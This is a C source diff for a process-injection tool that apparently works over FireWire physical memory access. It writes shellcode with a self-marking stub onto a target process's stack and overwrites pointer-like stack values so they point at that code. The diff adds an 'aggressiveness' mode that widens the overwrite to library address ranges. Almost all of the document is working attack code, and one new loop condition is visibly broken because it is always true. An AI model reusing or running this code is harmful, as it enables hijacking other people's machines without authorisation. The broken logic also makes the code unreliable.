@@ -47,20 +47,23 @@ enum memsource {
 
 char pagedir[4096];
 
-// i386-code that marks itself when being executed:
-// the 0x00 0xff 0xff 0x00 @5 change to 0xff 0x00 0x00 0xff
-char marker[] = { 0xe8, 0x04, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
-		  0x00, 0x5a, 0x8b, 0x02, 0xf7, 0xd0, 0x89, 0x02  };
+#define NODE_OFFSET     0xffc0
+
+// tries to inject the given code-blob with a marker-code in front of it into a process.
+// values of aggressiveness:
+// 	 & 1: write (but only at locations that are pointers into the binary)
+// 	 & 2: also try anywhere that may be a pointer to 0x08~~~~~~ or 0xb7~~~~~~ (does not write if not &1)
+void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen, int aggressiveness)
+{{{
+	// i386-code that marks itself when being executed:
+	// the 0x00 0xff 0xff 0x00 @5 change to 0xff 0x00 0x00 0xff
+	static const char marker[] = { 0xe8, 0x04, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
+				       0x00, 0x5a, 0x8b, 0x02, 0xf7, 0xd0, 0x89, 0x02  };
 #define MARKER_LEN 16
 #define MARK_OFFSET 5
 #define MARK_UNCHANGED 0x00ffff00
 #define MARK_CHANGED 0xff0000ff
 
-
-#define NODE_OFFSET     0xffc0
-
-void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen, int pretend)
-{{{
 	addr_t stack_bottom;
 	addr_t binary_first;
 	addr_t binary_last;
@@ -68,6 +71,11 @@ void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen
 	addr_t mark_location;
 	char*code;
 	char page[4096];
+
+	printf("\t" TERM_BLUE"aggressiveness: %s, %s" TERM_RESET "\n",
+			(aggressiveness&1)? "writing"         : "pretending",
+			(aggressiveness&2)? "binary and libs" : "only binary"
+		);
 
 	// we attach a self-changing marker to the shellcode. this way we can test,
 	// if the shellcode has been executed, yet.
@@ -117,7 +125,7 @@ void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen
 		printf("\t" TERM_BLUE "the place where i am injecting MAY contain process-data or -stack!" TERM_RESET "\n");
 	//insert code
 	printf("\tinserting code into the stack at 0x%08llx\n", code_location);
-	if(!pretend)
+	if(aggressiveness & 1)
 		linear_write(lin, code_location, code, codelen);
 
 	// replace all interesting pointers on stack with pointer to our code
@@ -130,7 +138,6 @@ void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen
 	uint32_t dest_value;			// the value we wish to write
 	uint32_t mark_value;			// value of the mark
 	addr_t seeker;				// pointer for seeking over the stack
-//	int do_sleep = 0;
 	int top_of_stack = 0;			// marked, if there was one stack-page unmapped
 
 	seeker = code_location;
@@ -141,11 +148,11 @@ void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen
 #endif
 	linear_read(lin, mark_location, &mark_value, 4);
 	printf("\t* mark is 0x%08x\n",mark_value);
-	while(pretend || (mark_value == MARK_UNCHANGED)) {
+	while(!(aggressiveness & 0) || (mark_value == MARK_UNCHANGED)) {
 		if(linear_is_pagedir_fast(lin, pagedir)) {
 			if(0 > linear_read(lin, seeker, &stackvalue, 4)) {
 				if(top_of_stack) {
-					printf("\t" TERM_BLUE "reached end of stack. aborting." TERM_RESET "\n");
+					printf("\t" TERM_YELLOW "reached end of stack. aborting." TERM_RESET "\n");
 					break;
 				} else {
 					printf("\t" TERM_BLUE "possibly reached top of stack." TERM_RESET "trying one more\n");
@@ -158,22 +165,27 @@ void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen
 #ifdef __BIG_ENDIAN__
 			stackvalue = endian_swap32(stackvalue);
 #endif
-			if( (stackvalue > binary_first) && (stackvalue < binary_last) ) {
-				printf("\t\toverwriting value at 0x%08llx: 0x%08x with codebase\n", seeker, stackvalue);
-				// could be a value; just overwrite it.
-				if(!pretend)
-					linear_write(lin, seeker, &dest_value, 4);
-//				do_sleep = 1;
+			if(aggressiveness & 2) {
+				if( (stackvalue >= 0x08000000 && stackvalue <= 0x08ffffff)
+				  ||(stackvalue >= 0xb7000000 && stackvalue <= 0xb7ffffff) ) {
+					printf("\t\toverwriting value at 0x%08llx: 0x%08x with codebase\n", seeker, stackvalue);
+					// could be a value; just overwrite it.
+					if(aggressiveness & 1)
+						linear_write(lin, seeker, &dest_value, 4);
+				}
+			} else {
+				if( (stackvalue > binary_first) && (stackvalue < binary_last) ) {
+					printf("\t\toverwriting value at 0x%08llx: 0x%08x with codebase\n", seeker, stackvalue);
+					// could be a value; just overwrite it.
+					if(aggressiveness & 1)
+						linear_write(lin, seeker, &dest_value, 4);
+				}
 			}
 		} else {
-			printf("\t" TERM_BLUE "process terminated" TERM_RESET "\n");
+			printf("\t" TERM_YELLOW "process vanished" TERM_RESET "\n");
 			break;
 		}
 		seeker -= 4;
-//		if(do_sleep) {
-//			do_sleep = 0;
-//			sleep(1);
-//		}
 		linear_read(lin, mark_location, &mark_value, 4);
 	}
 	printf("\t* mark is 0x%08x\n",mark_value);
@@ -203,15 +215,19 @@ int main(int argc, char**argv)
 	char *seek_binary = NULL;
 	char *inject_file = NULL;
 	int pretend = 0;
+	int aggressive = 0;
 
 	enum memsource memsource = SOURCE_UNDEFINED;
 	char *filename = NULL;
 	int nodeid = 0;
 
-	while( -1 != (c = getopt(argc, argv, "pn:f:b:c:"))) {
+	while( -1 != (c = getopt(argc, argv, "pan:f:b:c:"))) {
 		switch (c) {
 			case 'p':
 				pretend = 1;
+				break;
+			case 'a':
+				aggressive = 1;
 				break;
 			case 'n':
 				// phys.source: ieee1394
@@ -353,7 +369,7 @@ int main(int argc, char**argv)
 							printf("\tgot %d bytes from \"%s\".\n", codelen, inject_file);
 						}
 
-						try_inject(lin, pn, codebuffer, codelen, pretend);
+						try_inject(lin, pn, codebuffer, codelen, (pretend ? 0 : 1) | (aggressive ? 2 : 0));
 						close(fd);
 
 						break;
